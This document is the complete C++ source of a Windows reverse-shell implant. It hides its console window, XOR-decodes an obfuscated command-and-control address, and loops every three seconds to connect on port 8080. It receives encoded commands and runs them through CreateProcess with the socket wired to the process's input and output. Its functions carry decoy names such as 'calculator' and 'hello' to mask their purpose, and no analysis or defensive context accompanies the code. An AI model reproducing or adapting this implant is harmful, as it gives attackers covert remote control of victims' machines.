#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
using namespace std;

void hello(char* encryptedString,char key, char* decryptedString){
    for(int i=0;i<strlen(encryptedString);i++){
        decryptedString[i] = encryptedString[i]^key;
    }
}

void calculator(char* C2Server, int C2Port) {
    while(true) {
        Sleep(3000);   

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
   
        addr.sin_addr.s_addr = inet_addr(C2Server);  
        addr.sin_port = htons(C2Port);     

        
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {

                int decprocesslen = sizeof(RecvData);
                memset(RecvData, 0, sizeof(RecvData));
                RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if(RecvCode <=0){
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                char decprocess[decprocesslen];
                memset(decprocess, 0, sizeof(decprocess));
                hello(RecvData, 'U', decprocess);
                memset(RecvData, 0, sizeof(RecvData));

                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
                CreateProcess(NULL, decprocess, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}

int main() {
    FreeConsole();
    char encryptedhost[] = "edzglzezedm";
    int port = 8080;
    int encryptedhostlength = 11 ;
    char *decryptedhost = (char*)malloc(sizeof(char)*encryptedhostlength);
    hello(encryptedhost, 'T', decryptedhost);
    calculator(decryptedhost, port);
    return 0;
}
